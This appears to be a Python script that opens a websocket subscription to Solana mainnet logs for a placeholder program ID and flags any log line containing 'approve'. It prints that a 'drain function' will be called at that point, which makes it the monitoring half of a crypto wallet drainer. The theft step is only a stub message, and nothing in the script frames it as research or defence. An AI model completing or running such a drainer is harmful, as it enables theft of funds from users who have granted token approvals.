import asyncio
import json
from solana.rpc.async_api import AsyncClient
from solana.rpc.websocket_api import connect

PROGRAM_ID = "YOUR_PROGRAM_ID"

async def listen_approvals():
    async with connect("wss://api.mainnet-beta.solana.com") as websocket:
        await websocket.send(json.dumps({
            "jsonrpc": "2.0",
            "id": 1,
            "method": "logsSubscribe",
            "params": [
                {"mentions": [PROGRAM_ID]},
                {"commitment": "confirmed"}
            ]
        }))
        print("Listening for approve transactions...")
        while True:
            msg = await websocket.recv()
            data = json.loads(msg[0])
            if 'params' in data:
                logs = data['params']['result']['value']['logs']
                for log in logs:
                    if "approve" in log.lower():
                        print("Approve detected!")
                        print("Drain function will be called here.")

async def main():
    await listen_approvals()

if __name__ == "__main__":
    asyncio.run(main())
